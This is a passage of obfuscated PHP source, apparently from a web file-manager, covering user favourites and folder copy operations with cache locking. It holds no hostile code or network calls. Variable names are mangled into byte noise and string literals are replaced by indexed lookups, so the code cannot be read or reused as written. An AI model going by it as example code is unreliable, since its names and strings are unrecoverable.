$¦Äç°•·); } public function remove($üÖ—”Åñ, $Í‡¨ğĞ = false) { $Õ¢Ø»ºğ =& $_SERVER[åÄ¼Ùßš]; $Ã…ˆµ²ï = $this->listData($üÖ—”Åñ); if (!$Ã…ˆµ²ï) { return; } if (!$Í‡¨ğĞ && $Ã…ˆµ²ï[$Õ¢Ø»ºğ[192]] == $Õ¢Ø»ºğ[91]) { return !1; } return parent::remove($üÖ—”Åñ); } public function enable($ôê·¿¨à, $‡‘ÙõÊ©) { return $this->update($ôê·¿¨à, array($_SERVER[åÄ¼Ùßš][2508] => $‡‘ÙõÊ©)); } public function run($ïöå‹ÔÔ) { return $this->update($ïöå‹ÔÔ, array($_SERVER[åÄ¼Ùßš][2520] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($îıÆ…Êñ) { $µæ¾Ìµ =& $_SERVER[åÄ¼Ùßš]; return array($µæ¾Ìµ[2132] => array(USER_ID, $µæ¾Ìµ[2521])); } protected function listData() { $§À›æ’ =& $_SERVER[åÄ¼Ùßš]; $ğÉæ—§ù = array($§À›æ’[1808] => USER_ID, $§À›æ’[570] => 0); $Õ¼É¯¶ = $§À›æ’[2522]; $½åÉìâ‹ = $this->field($Õ¼É¯¶)->where($ğÉæ—§ù)->order($§À›æ’[2523])->select(); return $½åÉìâ‹ ? $½åÉìâ‹ : array(); } protected function resetCache() { } protected function listView() { $Ü¤½Á¹ê =& $_SERVER[åÄ¼Ùßš]; $È¯•‡©€ = $this->listData(); $››¢ùÒû = array_filter_by_field($È¯•‡©€, $Ü¤½Á¹ê[33], $Ü¤½Á¹ê[502]); $¾™‡¾™Ã = array_to_keyvalue($››¢ùÒû, $Ü¤½Á¹ê[12], $Ü¤½Á¹ê[87]); if (!$¾™‡¾™Ã) { return $È¯•‡©€; } $æƒÅé¶Ü = 2000; $ºêÌóœË = array($Ü¤½Á¹ê[503] => array($Ü¤½Á¹ê[504], $¾™‡¾™Ã)); $°±Ãæ¹ = Model($Ü¤½Á¹ê[926])->listSource($ºêÌóœË, $æƒÅé¶Ü); $°±Ãæ¹ = array_merge($°±Ãæ¹[$Ü¤½Á¹ê[86]], $°±Ãæ¹[$Ü¤½Á¹ê[85]]); $°±Ãæ¹ = array_to_keyvalue($°±Ãæ¹, $Ü¤½Á¹ê[194]); foreach ($È¯•‡©€ as $ÑÂ‡ªÙ¯ => $ø¬±¢İ) { $ıåá÷˜¯ = $°±Ãæ¹[$ø¬±¢İ[$Ü¤½Á¹ê[87]]]; $ıåá÷˜¯ = $ıåá÷˜¯ ? $ıåá÷˜¯ : array(); $È¯•‡©€[$ÑÂ‡ªÙ¯] = array_merge($ıåá÷˜¯, $ø¬±¢İ); } return $È¯•‡©€; } protected function addFav($äØúöö–, $îŒ—çü’ = '', $€Íá´Ç = "\163\x6f\x75\162\x63\145") { $æù†Ë =& $_SERVER[åÄ¼Ùßš]; $×Æ£¢’ = array($æù†Ë[1808] => USER_ID, $æù†Ë[570] => 0, $æù†Ë[508] => $€Íá´Ç, $æù†Ë[507] => $äØúöö–); if ($this->where($×Æ£¢’)->find()) { return !1; } $×Æ£¢’ = array($æù†Ë[1808] => USER_ID, $æù†Ë[570] => 0); $éõßØÏ§ = $this->where($×Æ£¢’)->max($æù†Ë[2041]); if (!$éõßØÏ§) { $éõßØÏ§ = 0; } if (!$îŒ—çü’ && $€Íá´Ç == $æù†Ë[502]) { $ËÒ´è  = Model($æù†Ë[1466])->where(array($æù†Ë[503] => $äØúöö–))->find(); if (!$ËÒ´è ) { return !1; } $îŒ—çü’ = $ËÒ´è [$æù†Ë[32]]; } $îŒ—çü’ = $this->getAutoName($îŒ—çü’); $„±î¥ = array($æù†Ë[1808] => USER_ID, $æù†Ë[570] => 0, $æù†Ë[506] => $îŒ—çü’, $æù†Ë[507] => $äØúöö–, $æù†Ë[508] => $€Íá´Ç, $æù†Ë[2021] => $éõßØÏ§ + 1); return $this->add($„±î¥); } protected function remove($¬­ÄÃèô) { $–‹õâô =& $_SERVER[åÄ¼Ùßš]; $‹Æ¤ÛÉÔ = array($–‹õâô[1808] => USER_ID, $–‹õâô[505] => $¬­ÄÃèô); return $this->where($‹Æ¤ÛÉÔ)->delete(); } protected function removeByName($¿Å°«ûŞ) { $´¿‹˜–· =& $_SERVER[åÄ¼Ùßš]; $½áÛş­š = array($´¿‹˜–·[1808] => USER_ID, $´¿‹˜–·[506] => $¿Å°«ûŞ, $´¿‹˜–·[570] => 0); return $this->where($½áÛş­š)->delete(); } protected function rename($…ı‚Ã¦ì, $Ì÷èˆú) { $‹åÌ™§÷ =& $_SERVER[åÄ¼Ùßš]; if ($…ı‚Ã¦ì == $Ì÷èˆú) { return !1; } $ÆèÏÊ¶§ = $this->getAutoName($Ì÷èˆú); if ($Ì÷èˆú != $ÆèÏÊ¶§) { return !1; } $¹êŠ‰Û– = array($‹åÌ™§÷[1808] => USER_ID, $‹åÌ™§÷[570] => 0, $‹åÌ™§÷[32] => $…ı‚Ã¦ì); return $this->where($¹êŠ‰Û–)->save(array($‹åÌ™§÷[32] => $Ì÷èˆú)); } protected function resetSort($îÓ½ÛÖ­) { $ÕĞö™©é =& $_SERVER[åÄ¼Ùßš]; $îÓ½ÛÖ­ = is_array($îÓ½ÛÖ­) ? $îÓ½ÛÖ­ : array(); $ÉäÜ½Ğ¢ = array($ÕĞö™©é[1808] => USER_ID); for ($÷ãâûë“ = 0; $÷ãâûë“ < count($îÓ½ÛÖ­); $÷ãâûë“++) { $ÉäÜ½Ğ¢[$ÕĞö™©é[505]] = $îÓ½ÛÖ­[$÷ãâûë“]; $this->where($ÉäÜ½Ğ¢)->save(array($ÕĞö™©é[2021] => $÷ãâûë“ + 1)); } return !0; } protected function moveTop($ÒƒÎ²ª) { $Å‘šÃ÷Û =& $_SERVER[åÄ¼Ùßš]; $ÔÁÚ»Îé = array($Å‘šÃ÷Û[1808] => USER_ID, $Å‘šÃ÷Û[570] => 0); $§óŸæŸ = $this->where($ÔÁÚ»Îé)->where(array($Å‘šÃ÷Û[32] => $ÒƒÎ²ª))->find(); if (!$§óŸæŸ) { return; } $Çµ·í©á = $this->field($Å‘šÃ÷Û[484])->where($ÔÁÚ»Îé)->order($Å‘šÃ÷Û[2523])->select(); $Çµ·í©á = array_to_keyvalue($Çµ·í©á, $Å‘šÃ÷Û[12], $Å‘šÃ÷Û[484]); $çšê­–– = $Çµ·í©á; $Çµ·í©á = array_remove_value($Çµ·í©á, $§óŸæŸ[$Å‘šÃ÷Û[484]]); array_unshift($Çµ·í©á, $§óŸæŸ[$Å‘šÃ÷Û[484]]); return $this->resetSort($Çµ·í©á); } protected function moveBottom($Åì… ‡Û) { $ÏÇ“¤·½ =& $_SERVER[åÄ¼Ùßš]; $Ì’–ğå× = array($ÏÇ“¤·½[1808] => USER_ID, $ÏÇ“¤·½[570] => 0); $ÁÑ·íì‚ = $this->where($Ì’–ğå×)->max($ÏÇ“¤·½[2041]); $±®¯ä‰‹ = array($ÏÇ“¤·½[2041] => $ÁÑ·íì‚ + 1); return $this->where($Ì’–ğå×)->where(array($ÏÇ“¤·½[32] => $Åì… ‡Û))->save($±®¯ä‰‹); } private function getAutoName($€»í†ñ¤) { $ÙôÀä÷¡ =& $_SERVER[åÄ¼Ùßš]; $§Õ‡óÚ = array($ÙôÀä÷¡[1808] => USER_ID, $ÙôÀä÷¡[570] => 0); $úÀ”Êà = $this->field($ÙôÀä÷¡[32])->where($§Õ‡óÚ)->select(); $úÀ”Êà = array_to_keyvalue($úÀ”Êà, $ÙôÀä÷¡[12], $ÙôÀä÷¡[32]); if (!$úÀ”Êà || !in_array($€»í†ñ¤, $úÀ”Êà)) { return $€»í†ñ¤; } for ($„ÔÑşÔŒ = 0; $„ÔÑşÔŒ < count($úÀ”Êà); $„ÔÑşÔŒ++) { if (!in_array($€»í†ñ¤ . "\50{$„ÔÑşÔŒ}\x29", $úÀ”Êà)) { return $€»í†ñ¤ . "\x28{$„ÔÑşÔŒ}\51"; } } return $€»í†ñ¤ . "\50{$„ÔÑşÔŒ}\51"; } } goto aÏ…ÊøàøÕ; aˆ„·»–Á: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ŠÛ¾©¾ç) { $ë¯ƒµ•Ò =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $this->_lockCheck($ë¯ƒµ•Ò[634], $ŠÛ¾©¾ç); $Ş“¯Òï = 1; $this->_lockEvent($ŠÛ¾©¾ç, array($ë¯ƒµ•Ò[635], $ë¯ƒµ•Ò[636]), $Ş“¯Òï); $this->_lockParent($ŠÛ¾©¾ç, array($ë¯ƒµ•Ò[636]), $Ş“¯Òï); $this->_lockEvent($ŠÛ¾©¾ç, array($ë¯ƒµ•Ò[637], $ë¯ƒµ•Ò[638]), $Ş“¯Òï); $this->_lockCheckEnd($ë¯ƒµ•Ò[634], $ŠÛ¾©¾ç); } public function lockCopyEnd($ØàñÓÊ) { $ÊÖõ…à– =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $­ÊŸõ¬Ä = 0; $this->_lockEvent($ØàñÓÊ, array($ÊÖõ…à–[635], $ÊÖõ…à–[636]), $­ÊŸõ¬Ä); $this->_lockParent($ØàñÓÊ, array($ÊÖõ…à–[636]), $­ÊŸõ¬Ä); $this->_lockEvent($ØàñÓÊ, array($ÊÖõ…à–[637], $ÊÖõ…à–[638]), $­ÊŸõ¬Ä); } public function lockWriteStart($é‘üÛÌá, $Œœú¿è” = '') { $÷Ëõ¯§ =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷Ëõ¯§[635], $é‘üÛÌá); $±ºå€Ì¥ = 1; $this->_lockKey($÷Ëõ¯§[639] . $é‘üÛÌá . $÷Ëõ¯§[10] . $Œœú¿è”, $±ºå€Ì¥); $this->_lockEvent($é‘üÛÌá, array($÷Ëõ¯§[634], $÷Ëõ¯§[636]), $±ºå€Ì¥); $this->_lockParent($é‘üÛÌá, array($÷Ëõ¯§[634], $÷Ëõ¯§[636]), $±ºå€Ì¥); $this->_lockCheckEnd($÷Ëõ¯§[635], $é‘üÛÌá); } public function lockWriteEnd($×›€¬£å, $Ö«±©·Ù = '') { $àÒ¸âÕš =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $ÉÜñÁò¬ = 0; $this->_lockKey($àÒ¸âÕš[639] . $×›€¬£å . $àÒ¸âÕš[10] . $Ö«±©·Ù, $ÉÜñÁò¬); $this->_lockEvent($×›€¬£å, array($àÒ¸âÕš[634], $àÒ¸âÕš[636]), $ÉÜñÁò¬); $this->_lockParent($×›€¬£å, array($àÒ¸âÕš[634], $àÒ¸âÕš[636]), $ÉÜñÁò¬); } public function lockMoveStart($¼ÚÓæÒ¬) { $ç¢ù¢ÜÜ =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $this->_lockCheck($ç¢ù¢ÜÜ[636], $¼ÚÓæÒ¬); $¼áŞŠ¶« = 1; $this->_lockKey($ç¢ù¢ÜÜ[640] . $¼ÚÓæÒ¬, $¼áŞŠ¶«); $this->_lockEvent($¼ÚÓæÒ¬, array($ç¢ù¢ÜÜ[634], $ç¢ù¢ÜÜ[635]), $¼áŞŠ¶«); $this->_lockParent($¼ÚÓæÒ¬, array($ç¢ù¢ÜÜ[634], $ç¢ù¢ÜÜ[636]), $¼áŞŠ¶«); $this->_lockEvent($¼ÚÓæÒ¬, array($ç¢ù¢ÜÜ[641], $ç¢ù¢ÜÜ[637], $ç¢ù¢ÜÜ[638]), $¼áŞŠ¶«); $this->_lockCheckEnd($ç¢ù¢ÜÜ[636], $¼ÚÓæÒ¬); } public function lockMoveEnd($¿¬€¥Õ) { $‘È¡ãï =& $_SERVER[åÄ¼Ùßš]; if (!$this->allowLock()) { return; } $Åºİà â = 0; $this->_lockKey($‘È¡ãï[640] . $¿¬€¥Õ, $Åºİà â); $this->_lockEvent($¿¬€¥Õ, array($‘È¡ãï[634], $‘È¡ãï[635]), $Åºİà â); $this->_lockParent($¿¬€¥Õ, array($‘È¡ãï[634], $‘È¡ãï[636]), $Åºİà â); $this->_lockEvent($¿¬€¥Õ, array($‘È¡ãï[641], $‘È¡ãï[637], $‘È¡ãï[638]), $Åºİà â); } private function _lockCheck($ß˜ò†¸, $Ÿ¸¦Ğ°á) { $¤Ô™êÂ­ =& $_SERVER[åÄ¼Ùßš]; $’¬úŠÈ = $this->sourceInfo($Ÿ¸¦Ğ°á); $üÉçÇË­ = $ß˜ò†¸ . $¤Ô™êÂ­[10] . $Ÿ¸¦Ğ°á; $this->_lockTimeStart[$üÉçÇË­] = timeFloat(); if (!is_array($’¬úŠÈ)) { return; } $„ÄĞûÏ° = LNG($¤Ô™êÂ­[642]); CacheLock::setErrorMsg($¤Ô™êÂ­[176] . htmlspecialchars($’¬úŠÈ[$¤Ô™êÂ­[32]]) . $¤Ô™êÂ­[178] . $„ÄĞûÏ°); $this->_lockKey($üÉçÇË­, 1); $this->_lockKey($üÉçÇË­, 0); $£Öµñ = array_reverse($this->parentLevelArray($’¬úŠÈ[$¤Ô™êÂ­[597]])); foreach ($£Öµñ as $é¯ãÙ–‚) { $üÉçÇË­ = $ß˜ò†¸ . $¤Ô™êÂ­[643] . $é¯ãÙ–‚; if (CacheLock::lockGet($¤Ô™êÂ­[644] . $üÉçÇË­)) { $’¬úŠÈ = $this->sourceInfo($é¯ãÙ–‚); CacheLock::setErrorMsg($¤Ô™êÂ­[176] . htmlspecialchars($’¬úŠÈ[$¤Ô™êÂ­[32]]) . $¤Ô™êÂ­[178] . $„ÄĞûÏ°); $this->_lockKey($üÉçÇË­, 1); $this->_lockKey($üÉçÇË­, 0); } } } private function _lockCheckEnd($‚ŠãÑæ–, $Ë‹¾÷ ) { $Ş²Îïâí =& $_SERVER[åÄ¼Ùßš]; $‰¬£Ã’î = $‚ŠãÑæ– . $Ş²Îïâí[10] . $Ë‹¾÷ ; CacheLock::setErrorMsg($Ş²Îïâí[464]); if (!isset($this->_lockTimeStart[$‰¬£Ã’î])) { return; } $óÔøıå· = timeFloat() - $this->_lockTimeStart[$‰¬£Ã’î]; unset($this->_lockTimeStart[$‰¬£Ã’î]); if ($óÔøıå· > 0.5) { unset(self::$cacheSourceInfo[$Ş²Îïâí[544] . $Ë‹¾÷ ]); } $…Ïôšî = $this->sourceInfo($Ë‹¾÷ ); if (!$…Ïôšî) { show_json(LNG($Ş²Îïâí[108]), !1); } } private function _lockParent($È«üŒ¢, $¹‹ø–ûÈ, $ÖÆ¤€–) { if (!$this->autoLockSet) { return; } $·ÂÔßõ  = $this->sourceInfo($È«üŒ¢); if (!is_array($·ÂÔßõ )) { return; } $ú†­æ¡õ = array_reverse($this->parentLevelArray($·ÂÔßõ [$_SERVER[åÄ¼Ùßš][597]])); foreach ($ú†­æ¡õ as $Ôï¿ ºı) { $this->_lockEvent($Ôï¿ ºı, $¹‹ø–ûÈ, $ÖÆ¤€–); } } private function _lockEvent($Èé¬­»È, $áŞôÅÛé, $¿²¤ÛÁ¡) { $ğ™ıÖ¦ =& $_SERVER[åÄ¼Ùßš]; if (!$this->autoLockSet) { return; } foreach ($áŞôÅÛé as $ĞÖÒ±¤œ) { $²¢µÊ®½ = $ĞÖÒ±¤œ . $ğ™ıÖ¦[10] . $Èé¬­»È; if ($¿²¤ÛÁ¡ && CacheLock::lockGet($ğ™ıÖ¦[644] . $²¢µÊ®½)) { continue; } $this->_lockKey($²¢µÊ®½, $¿²¤ÛÁ¡); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($µÎÔŠÖ, $ûûã±Ö = 1) { $†¡Ã¿éö = $_SERVER[åÄ¼Ùßš][644] . md5($µÎÔŠÖ); if ($ûûã±Ö) { if (isset(self::$_lockItemArr[$†¡Ã¿éö])) { return; } self::$_lockItemArr[$†¡Ã¿éö] = 1; CacheLock::lock($†¡Ã¿éö, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$†¡Ã¿éö])) { return; } unset(self::$_lockItemArr[$†¡Ã¿éö]); CacheLock::unlock($†¡Ã¿éö); } } public function isParentOf($…©à•Óã, $Êºæ«ñ€) { $±Æ‹£Ü“ =& $_SERVER[åÄ¼Ùßš]; $°µŠîşÁ = $this->sourceInfo($…©à•Óã); $ô†ûœ‘ş = $this->sourceInfo($Êºæ«ñ€); $ïßì×¾Ş = $°µŠîşÁ[$±Æ‹£Ü“[597]] . $°µŠîşÁ[$±Æ‹£Ü“[194]] . $±Æ‹£Ü“[50]; $¢§Í„Äò = $ô†ûœ‘ş[$±Æ‹£Ü“[597]] . $ô†ûœ‘ş[$±Æ‹£Ü“[194]] . $±Æ‹£Ü“[50]; $¾èŸÖğÏ = strpos($¢§Í„Äò, $ïßì×¾Ş) === 0; return $¾èŸÖğÏ; } private $targetIsDelete = 0; public function copy($°ñš¸óÆ, $À™÷Ğß, $¢èÓ†÷á = REPEAT_REPLACE, $æìæÓşˆ = '') { $—±“Èíò =& $_SERVER[åÄ¼Ùßš]; $Ìù‘Ì¡³ = $this->sourceInfo($°ñš¸óÆ); $èé»…¾Ï = $this->sourceInfo($À™÷Ğß); if (!$Ìù‘Ì¡³ || !$èé»…¾Ï || $èé»…¾Ï[$—±“Èíò[497]] != $—±“Èíò[91]) { return !1; } if ($this->isParentOf($°ñš¸óÆ, $À™÷Ğß)) { return !1; } $İø³‰‰ù = $æìæÓşˆ ? $æìæÓşˆ : $Ìù‘Ì¡³[$—±“Èíò[32]]; $this->lockCopyStart($°ñš¸óÆ); $this->lockWriteStart($À™÷Ğß, $İø³‰‰ù); $¬ù°àÈõ = array($—±“Èíò[645] => array(), $—±“Èíò[646] => array(), $—±“Èíò[647] => array()); $this->targetIsDelete = intval($Ìù‘Ì¡³[$—±“Èíò[517]]); $‚×ŠáìÍ = $this->fileNameExistAuto($À™÷Ğß, $Ìù‘Ì¡³); $Ğãùú¡± = $this->_copy($°ñš¸óÆ, $À™÷Ğß, $¢èÓ†÷á, $¬ù°àÈõ, !0, $æìæÓşˆ); $this->_childrenListClear(); $this->lockCopyEnd($°ñš¸óÆ); $this->lockWriteEnd($À™÷Ğß, $İø³‰‰ù); if ($Ìù‘Ì¡³[$—±“Èíò[497]] == $—±“Èíò[91] && $‚×ŠáìÍ == $Ğãùú¡±) { $this->folderSizeResetChildren($‚×ŠáìÍ); } Model($—±“Èíò[648])->addAll($¬ù°àÈõ[$—±“Èíò[646]], array(), !0); if ($‚×ŠáìÍ != $Ğãùú¡± || $Ìù‘Ì¡³[$—±“Èíò[497]] == $—±“Èíò[91]) { Model($—±“Èíò[649])->eventCopy($Ğãùú¡±); } $this->saveAll($¬ù°àÈõ[$—±“Èíò[647]]); Model($—±“Èíò[233])->linkAdd($¬ù°àÈõ[$—±“Èíò[645]]); $this->folderSizeReset($À™÷Ğß); $this->updateModifyTime($À™÷Ğß); return $Ğãùú¡±; } private function _copy($ÓÇÙãè¸, $ÍËÚúÖÓ, $Šé§ÛşÑ, &$ğ¯Ë›ìÇ, $ò ‘İ·ï, $Îñ’Äë = '') { $˜—Äëƒ =& $_SERVER[åÄ¼Ùßš]; $Ğåºì…‰ = $this->sourceInfoCache($ÓÇÙãè¸); $ÍïÑ§û¨ = $Ğåºì…‰[$˜—Äëƒ[497]] == $˜—Äëƒ[91]; $»“²ü¤¤ = $Îñ’Äë ? $Îñ’Äë : $Ğåºì…‰[$˜—Äëƒ[32]]; $îÅ–ûÇÇ = $this->fileNameExistAuto($ÍËÚúÖÓ, $Ğåºì…‰); if ($ò ‘İ·ï) { $this->_childrenAllMake($ÓÇÙãè¸); if ($ÍïÑ§û¨ && $îÅ–ûÇÇ) { $this->_childrenAllMake($îÅ–ûÇÇ); } } if (!$îÅ–ûÇÇ) { return $this->_copyCreate($ÓÇÙãè¸, $ÍËÚúÖÓ, $»“²ü¤¤, $ğ¯Ë›ìÇ); } $üÕöÎú = $îÅ–ûÇÇ; if ($ÍïÑ§û¨) { if ($Šé§ÛşÑ == REPEAT_RENAME_FOLDER) { $»“²ü¤¤ = $this->fileNameAutoCache($ÍËÚúÖÓ, $»“²ü¤¤, $Šé§ÛşÑ, $ÍïÑ§û¨); $üÕöÎú = $this->_copyCreate($ÓÇÙãè¸, $ÍËÚúÖÓ, $»“²ü¤¤, $ğ¯Ë›ìÇ); } else { $¤Œˆ¨ĞÊ = $this->_childrenList($ÓÇÙãè¸); foreach ($¤Œˆ¨ĞÊ as $Ç…ÛÙŸ½) { $this->_copy($Ç…ÛÙŸ½[$˜—Äëƒ[194]], $îÅ–ûÇÇ, $Šé§ÛşÑ, $ğ¯Ë›ìÇ, !1); } } } else { if ($Šé§ÛşÑ == REPEAT_RENAME || $Šé§ÛşÑ == REPEAT_RENAME_FOLDER) { $»“²ü¤¤ = $this->fileNameAutoCache($ÍËÚúÖÓ, $»“²ü¤¤, $Šé§ÛşÑ, $ÍïÑ§û¨); $üÕöÎú = $this->_copyCreate($ÓÇÙãè¸, $ÍËÚúÖÓ, $»“²ü¤¤, $ğ¯Ë›ìÇ); } else { if ($Šé§ÛşÑ == REPEAT_REPLACE) { $ş€ƒç£Ü = $this->sourceInfoCache($îÅ–ûÇÇ); $À»îÖãÒ = $this->fileHistory($ş€ƒç£Ü, $Ğåºì…‰[$˜—Äëƒ[554]], $Ğåºì…‰[$˜—Äëƒ[79]]); if ($À»îÖãÒ) { $ğ¯Ë›ìÇ[$˜—Äëƒ[645]][] = $Ğåºì…‰[$˜—Äëƒ[554]]; } } else { if ($Šé§ÛşÑ == REPEAT_SKIP) { } } } Hook::trigger($˜—Äëƒ[650], array($˜—Äëƒ[651], $Ğåºì…‰, 0)); } return $üÕöÎú; } private function _copyCreate($ªÌÆåûÛ, $®€Êµ¶˜, $ŞŸô©‡, &$»¸ª«øà) { $½†®çì÷ =& $_SERVER[åÄ¼Ùßš]; $áÙ¾›ûÔ = $this->sourceInfoCache($ªÌÆåûÛ); $ıµüÌŞø = $this->sourceInfoCache($®€Êµ¶˜); $ Ï÷¡Ï… = $this->_makeItemData($áÙ¾›ûÔ, $ıµüÌŞø, $ŞŸô©‡); Hook::trigger($½†®çì÷[652], $ Ï÷¡Ï…); Hook::trigger($½†®çì÷[653], array($½†®çì÷[654], $ Ï÷¡Ï…, 0)); $â¼ëÔĞ‚ = $this->add($ Ï÷¡Ï…); $·âü–ê = array($½†®çì÷[194] => $â¼ëÔĞ‚, $½†®çì÷[32] => $ŞŸô©‡); $this->_copyApplyMeta($·âü–ê, $»¸ª«øà); if ($áÙ¾›ûÔ[$½†®çì÷[497]] != $½†®çì÷[91]) { $»¸ª«øà[$½†®çì÷[645]][] = $áÙ¾›ûÔ[$½†®çì÷[554]]; return $â¼ëÔĞ‚; } $Ê‘²¶ê† = array(); $¬÷• ® = array(); $this->_childrenListAll($ªÌÆåûÛ, $Ê‘²¶ê†); $Ìèä–âÏ = count($Ê‘²¶ê†); if ($Ìèä–âÏ == 0) { return $â¼ëÔĞ‚; } $›ÚûºòÂ = $this->sourceInfo($â¼ëÔĞ‚); foreach ($Ê‘²¶ê† as $˜ºğË”‹) { $²ù›ô… = $this->_makeItemData($˜ºğË”‹, $›ÚûºòÂ, $˜ºğË”‹[$½†®çì÷[32]]); $²ù›ô…[$½†®çì÷[597]] = $˜ºğË”‹[$½†®çì÷[597]]; $¬÷• ®[] = $²ù›ô…; } $this->chunkEventSet($½†®çì÷[655], array($½†®çì÷[656], $ Ï÷¡Ï…, $Ìèä–âÏ)); $this->addAll($¬÷• ®, array(), !1); $£ „Úó¤ = $this->where(array($½†®çì÷[193] => $â¼ëÔĞ‚))->select(); $ÌÖÄËÊ = $this->_childrenMakeRelation($Ê‘²¶ê†, $£ „Úó¤); $ÌÖÄËÊ[$ªÌÆåûÛ] = $â¼ëÔĞ‚; $É†Éô = array(); $Øà¶½ñ = array(); foreach ($£ „Úó¤ as $˜ºğË”‹) { $Ê¼›Í´² = $˜ºğË”‹[$½†®çì÷[194]]; $”úöÊ¿ã = $this->_childrenMatch($ÌÖÄËÊ, $˜ºğË”‹, $›ÚûºòÂ); $É†Éô[] = array($½†®çì÷[194], $Ê¼›Í´², $½†®çì÷[193], $”úöÊ¿ã[$½†®çì÷[193]]); $Øà¶½ñ[] = array($½†®çì÷[194], $Ê¼›Í´², $½†®çì÷[597], $”úöÊ¿ã[$½†®çì÷[597]]); $this->_copyApplyMeta($˜ºğË”‹, $»¸ª«øà); if ($˜ºğË”‹[$½†®çì÷[497]] != $½†®çì÷[91]) { $»¸ª«øà[$½†®çì÷[645]][] = $˜ºğË”‹[$½†®çì÷[554]]; } } $this->chunkEventSet($½†®çì÷[657], array($½†®çì÷[658], $ Ï÷¡Ï…, $Ìèä–âÏ)); $this->saveAll($É†Éô); $this->chunkEventSet($½†®çì÷[659], array($½†®çì÷[660], $ Ï÷¡Ï…, $Ìèä–âÏ)); $this->saveAll($Øà¶½ñ); return $â¼ëÔĞ‚; } private function _childrenMakeRelation($Ö¸¦Çƒ×, $†Ä•íÉ÷) { $ëïû«õ¸ =& $_SERVER[åÄ¼Ùßš]; $–ÑÕÕğÁ = array(); $ìÈ€Ú¨ = array(); foreach ($Ö¸¦Çƒ× as $åÎÑ™Æ) { $ÓÜàØÁ§ = $åÎÑ™Æ[$ëïû«õ¸[32]] . $ëïû«õ¸[8] . $åÎÑ™Æ[$ëïû«õ¸[597]]; $–ÑÕÕğÁ[$ÓÜàØÁ§] = $åÎÑ™Æ[$ëïû«õ¸[194]]; } foreach ($†Ä•íÉ÷ as $åÎÑ™Æ) { $ÓÜàØÁ§ = $åÎÑ™Æ[$ëïû«õ¸[32]] . $ëïû«õ¸[8] . $åÎÑ™Æ[$ëïû«õ¸[597]]; $¸¹²¯ŠÈ = $–ÑÕÕğÁ[$ÓÜàØÁ§]; $ìÈ€Ú¨[$¸¹²¯ŠÈ] = $åÎÑ™Æ[$ëïû«õ¸[194]]; } return $ìÈ€Ú¨; } private function _childrenMatch($ÖÌ¤áÃÂ, $•¡ê’—‚, $Æ„ì„ÁÅ) { $í÷âÎÇ¿ =& $_SERVER[åÄ¼Ùßš]; $ÁÖğÃœ = $Æ„ì„ÁÅ[$í÷âÎÇ¿[597]]; $æ÷ò¥éš = $this->parentLevelArray($•¡ê’—‚[$í÷âÎÇ¿[597]]); foreach ($æ÷ò¥éš as $âöÉç´) { if (isset($ÖÌ¤áÃÂ[$âöÉç´])) { $ÁÖğÃœ .= $ÖÌ¤áÃÂ[$âöÉç´] . $í÷âÎÇ¿[661]; } } $ÁÖğÃœ = rtrim($ÁÖğÃœ, $í÷âÎÇ¿[50]) . $í÷âÎÇ¿[50]; $â±á·ï½ = $this->parentLevelArray($ÁÖğÃœ); $§ÀĞ­—î = $â±á·ï½[count($â±á·ï½) - 1]; return array($í÷âÎÇ¿[193] => $§ÀĞ­—î, $í÷âÎÇ¿[597] => $ÁÖğÃœ); } private function _makeItemData($»°ï˜ı§, $®õ½–øÓ, $ÈÑàÃôÙ) { $êÂ…ÏÛú =& $_SERVER[åÄ¼Ùßš]; $®›¼¥”ğ = array($êÂ…ÏÛú[662] => $»°ï˜ı§[$êÂ…ÏÛú[497]], $êÂ…ÏÛú[506] => $ÈÑàÃôÙ, $êÂ…ÏÛú[663] => $»°ï˜ı§[$êÂ…ÏÛú[498]] ? $»°ï˜ı§[$êÂ…ÏÛú[498]] : $êÂ…ÏÛú[12], $êÂ…ÏÛú[555] => $»°ï˜ı§[$êÂ…ÏÛú[554]] ? $»°ï˜ı§[$êÂ…ÏÛú[554]] : 0, $êÂ…ÏÛú[633] => $»°ï˜ı§[$êÂ…ÏÛú[79]] ? $»°ï˜ı§[$êÂ…ÏÛú[79]] : 0, $êÂ…ÏÛú[664] => intval($®õ½–øÓ[$êÂ…ÏÛú[191]]), $êÂ…ÏÛú[665] => intval($®õ½–øÓ[$êÂ…ÏÛú[582]]), $êÂ…ÏÛú[666] => intval(USER_ID), $êÂ…ÏÛú[667] => intval(USER_ID), $êÂ…ÏÛú[489] => intval($®õ½–øÓ[$êÂ…ÏÛú[194]]), $êÂ…ÏÛú[668] => $®õ½–øÓ[$êÂ…ÏÛú[597]] . $®õ½–øÓ[$êÂ…ÏÛú[194]] . $êÂ…ÏÛú[50], $êÂ…ÏÛú[510] => $»°ï˜ı§[$êÂ…ÏÛú[88]] ? $»°ï˜ı§[$êÂ…ÏÛú[88]] : time(), $êÂ…ÏÛú[516] => 0, $êÂ…ÏÛú[669] => $êÂ…ÏÛú[12]); return $®›¼¥”ğ; } private function _copyApplyMeta($‚ïÍ¼üš, &$Ç²©Üı) { $“Üõ‡¨Ó =& $_SERVER[åÄ¼Ùßš]; $ìô¬ÎÄ© = $‚ïÍ¼üš[$“Üõ‡¨Ó[194]]; $Á¼ÊÑ³ø = $‚ïÍ¼üš[$“Üõ‡¨Ó[32]]; if (!isset($‚ïÍ¼üš[$“Üõ‡¨Ó[670]]) || !$‚ïÍ¼üš[$“Üõ‡¨Ó[670]] || $‚ïÍ¼üš[$“Üõ‡¨Ó[670]] == $“Üõ‡¨Ó[231]) { $Ç²©Üı[$“Üõ‡¨Ó[647]][] = array($“Üõ‡¨Ó[194], $ìô¬ÎÄ©, $“Üõ‡¨Ó[670], short_id($ìô¬ÎÄ©)); } if (Input::check($Á¼ÊÑ³ø, $“Üõ‡¨Ó[671])) { $Ç²©Üı[$“Üõ‡¨Ó[646]][] = array($“Üõ‡¨Ó[194] => $ìô¬ÎÄ©, $“Üõ‡¨Ó[97] => $“Üõ‡¨Ó[549], 